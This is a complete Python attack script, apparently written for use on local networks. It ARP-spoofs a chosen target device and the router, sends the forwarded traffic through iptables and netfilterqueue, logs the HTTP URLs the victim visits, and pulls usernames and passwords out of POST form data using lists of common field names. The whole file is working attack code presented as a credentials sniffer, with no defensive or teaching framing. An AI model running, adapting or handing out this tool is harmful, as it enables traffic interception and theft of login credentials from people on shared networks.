#!/usr/bin/env python3

import os
import sys
import re
import argparse
import threading
from urllib.parse import unquote, parse_qs
from urllib.parse import unquote_plus
import scapy.all as scapy
from netfilterqueue import NetfilterQueue

# Define user/login related fields
user_fields = [
    "phone", "user_pass", "uname", "user_login", "user_name", "email",
    "pseudonym", "userid", "login", "user", "username"
]

pass_fields = [
    "pass",        # <-- add this common password field name
    "passwd", "passwrd", "login_password", "pwd", "passphrase",
    "password", "user_password", "pswd", "userpwd", "upass", "pwd1",
    "secure_pass", "auth_pass", "mypassword", "account_password"
]

def enable_ip_forward():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forward():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Could not get MAC address for {target_ip}")
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    if not target_mac or not source_mac:
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=5, verbose=False)

def mitm(target_ip, router_ip, stop_event):
    print("[*] Starting ARP spoofing... Press Ctrl+C to stop")
    try:
        while not stop_event.is_set():
            spoof(target_ip, router_ip)
            spoof(router_ip, target_ip)
            stop_event.wait(2)
    except KeyboardInterrupt:
        pass
    print("[*] Restoring ARP tables...")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.TCP) and (scapy_packet[scapy.TCP].dport == 80 or scapy_packet[scapy.TCP].sport == 80):
        try:
            payload = bytes(scapy_packet[scapy.Raw].load).decode("utf-8", errors="ignore")
        except:
            packet.accept()
            return

        host = None
        host_match = re.search(r"Host: ([^\r\n]+)", payload)
        if host_match:
            host = host_match.group(1).strip()

        # Print visited HTTP GET URLs
        get_match = re.search(r"GET (.*?) HTTP/1\.[01]", payload)
        if get_match and host:
            url = f"http://{host}{get_match.group(1)}"
            print(f"Visited link: {url}")

        # Process POST requests for credentials
        if "POST" in payload and host:
            parts = payload.split("\r\n\r\n", 1)
            if len(parts) == 2:
                body = parts[1]  # POST data (still URL encoded)

                # Parse URL-encoded form data robustly
                parsed_body = parse_qs(body)

                creds = {}
                for key, values in parsed_body.items():
                    key_lower = key.lower()
                    if key_lower in user_fields + pass_fields:
                        creds[key_lower] = values[0]  # take first value

                if creds:
                    print(f"URL: http://{host}")

                    # Extract login/user field - first found from user_fields in creds
                    login = None
                    for ufield in user_fields:
                        if ufield in creds:
                            login = creds[ufield]
                            break
                    if not login:
                        login = "N/A"

                    # Extract password field - first found from pass_fields in creds
                    pwd = None
                    for pfield in pass_fields:
                        if pfield in creds:
                            pwd = creds[pfield]
                            break
                    if not pwd:
                        pwd = "N/A"

                    print(f"LOGIN: {login}")
                    print(f"PWD: {pwd}")
                    print(f"CONTENT: {unquote_plus(body)}")

    packet.accept()

def main():
    parser = argparse.ArgumentParser(description="MITM HTTP and credentials sniffer")
    parser.add_argument("-t", "--target", required=True, help="Target IP address (phone)")
    parser.add_argument("-r", "--router", required=True, help="Router IP address")
    parser.add_argument("iface", help="Network interface to use (e.g. wlan0)")
    args = parser.parse_args()

    enable_ip_forward()

    stop_event = threading.Event()
    thread = threading.Thread(target=mitm, args=(args.target, args.router, stop_event))
    thread.start()

    print("[*] Setting iptables rules for packet capture")
    os.system(f"iptables -I FORWARD -i {args.iface} -s {args.target} -j NFQUEUE --queue-num 1")
    os.system(f"iptables -I FORWARD -o {args.iface} -d {args.target} -j NFQUEUE --queue-num 1")

    nfqueue = NetfilterQueue()
    try:
        nfqueue.bind(1, process_packet)
        print("[*] Starting packet capture. Press Ctrl+C to stop.")
        nfqueue.run()
    except KeyboardInterrupt:
        pass
    finally:
        nfqueue.unbind()
        print("[*] Restoring iptables...")
        os.system(f"iptables -D FORWARD -i {args.iface} -s {args.target} -j NFQUEUE --queue-num 1")
        os.system(f"iptables -D FORWARD -o {args.iface} -d {args.target} -j NFQUEUE --queue-num 1")
        stop_event.set()
        thread.join()
        disable_ip_forward()
        print("[*] Exiting...")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Please run as root")
        sys.exit(1)
    main()
